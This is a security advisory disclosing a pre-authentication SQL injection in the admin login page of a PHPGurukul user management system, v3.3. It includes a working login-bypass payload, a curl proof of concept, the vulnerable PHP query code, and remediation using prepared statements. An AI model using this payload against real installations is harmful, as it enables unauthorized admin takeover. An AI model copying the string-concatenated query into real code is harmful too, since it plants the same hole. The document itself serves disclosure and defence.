# PHPGurukul User Registration & Login and User Management System v3.3 — admin/index.php SQL Injection → Unauthenticated Admin Login Bypass

- Affected Product: PHPGurukul “User Registration & Login and User Management System With admin panel”
- Version: 3.3 (older versions may also be affected; not verified)
- Endpoint: `/loginsystem/admin/index.php`
- Parameter: `username` (POST)
- Authentication: None (Pre‑Auth)
- Vulnerability Type: SQL Injection (CWE‑89) → Authentication Bypass
- Severity: Critical
- Proposed CVSS v3.1: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` → 10.0

## Summary

A SQL injection in the admin login endpoint allows an unauthenticated attacker to bypass authentication and obtain an administrator session. The `username` parameter is concatenated directly into the SQL `WHERE` clause, and using a line comment truncation removes the password comparison, making the condition tautological.

This issue is distinct from other known SQL injections reported for different endpoints (e.g., `/admin/manage-users.php` with `ID` parameter, and `/admin/user-profile.php` with `uid` parameter that requires an authenticated admin session). This advisory focuses on `/admin/index.php` with `username` and is a pre‑auth login bypass.

## Reproduction Steps

1) Send a POST request to `/loginsystem/admin/index.php` with `Content-Type: application/x-www-form-urlencoded`.

2) Body (example payloads):
username=' OR 1=1 #&password=abc&login=Login

3) Expected Result: The response contains a client-side redirect to `dashboard.php`, and the browser lands on the admin dashboard with a valid admin session.

### PoC (Windows curl)

```bash
curl -i -s -k -X POST "http://localhost/loginsystem/admin/index.php" -H "Content-Type: application/x-www-form-urlencoded" --data "username=' OR 1=1 #&password=abc&login=Login"
```

If successful, the HTML will include:
<script>window.location.href='dashboard.php'</script>

## Technical Analysis

The vulnerable logic concatenates user input directly into an SQL query:

```php
// File: loginsystem/admin/index.php (login handler)
<?php
// ... existing code ...
$adminusername = $_POST['username'];
$pass = md5($_POST['password']);
$ret = mysqli_query($con, "SELECT * FROM admin WHERE username='$adminusername' and password='$pass'");
$num = mysqli_fetch_array($ret);
// ... existing code ...
```

An attacker-controlled `username` such as `' OR 1=1 #` rewrites the query:

```sql
SELECT * FROM admin WHERE username='' OR 1=1 # ' and password='d41d8cd98f00b204e9800998ecf8427e'
```

The password check is commented out, the condition becomes true, and the first admin record is returned, granting a session.

## Impact

- Full admin takeover (read/modify/delete users and data).
- Potential database compromise and chained attacks.
- High risk to confidentiality, integrity, and availability.

## Affected Version

- Confirmed on: 3.3  
- Earlier versions may also be affected but are not verified in this advisory.

## Distinction from Other Reports

- This advisory covers `/admin/index.php` with `username` (Pre‑Auth admin bypass).
- It is different from issues on:
  - `/admin/manage-users.php` using `ID` (SQLi, different endpoint/parameter).
  - `/admin/user-profile.php` using `uid` (SQLi requiring authenticated admin session).

## Recommended Remediation

1) Replace raw concatenation with prepared statements:
```php
// Secure example (mysqli prepared statement)
<?php
// ... existing code ...
$adminusername = $_POST['username'];
$pass = $_POST['password']; // store and compare using password_hash/password_verify, not md5

$stmt = $con->prepare("SELECT id, username, password FROM admin WHERE username = ?");
$stmt->bind_param("s", $adminusername);
$stmt->execute();
$res = $stmt->get_result();
$row = $res->fetch_assoc();

if ($row && password_verify($pass, $row['password'])) {
    $_SESSION['login'] = $row['username'];
    $_SESSION['adminid'] = $row['id'];
    echo "<script>window.location.href='dashboard.php'</script>";
    exit();
} else {
    echo "<script>alert('Invalid username or password');</script>";
    echo "<script>window.location.href='index.php'</script>";
    exit();
}
// ... existing code ...
```

2) Migrate password storage to `password_hash()` / `password_verify()`; never use `md5()` for credentials.

3) Apply consistent parameterization across the codebase, add CSRF protection for state-changing operations, and ensure output encoding for all user-controlled data.

## Disclosure Timeline

- 2025-09-25: Vulnerability discovered and validated locally.


## References

- Product page: https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/
- This advisory: https://github.com/romatdibrohiksnov/vulndb.com/blob/main/PHPGurukul%20User%20Registration%20%26%20Login%20and%20User%20Management%20System%20v3.3%20%20SQL%20Injection%20%E2%86%92%20Unauthenticated%20Admin%20Login%20Bypass.md

